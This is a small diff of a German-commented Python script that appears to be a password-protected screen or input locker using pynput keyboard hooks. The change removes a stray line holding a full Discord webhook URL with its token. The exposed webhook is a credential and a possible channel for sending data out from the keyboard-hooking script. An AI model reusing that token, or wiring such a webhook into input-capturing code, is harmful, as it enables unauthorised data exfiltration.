@@ -3,9 +3,7 @@ import ctypes
 import time
 import threading
 from pynput import keyboard
-import sys
-https://discord.com/api/webhooks/1324159751604539443/SojZoLOYUd2Nj4wgjBinciMcritKjXAJ37zXye13X0wOKhKxSQlo7z7Epe4yekpE3km-
-# Globale Variablen
+import sys# Globale Variablen
 password = "sicherespasswort"  # Passwort, das zur Entsperrung erforderlich ist
 attempts = 0  # Anzahl der falschen Versuche
 max_attempts = 3  # Maximale erlaubte Fehlversuche
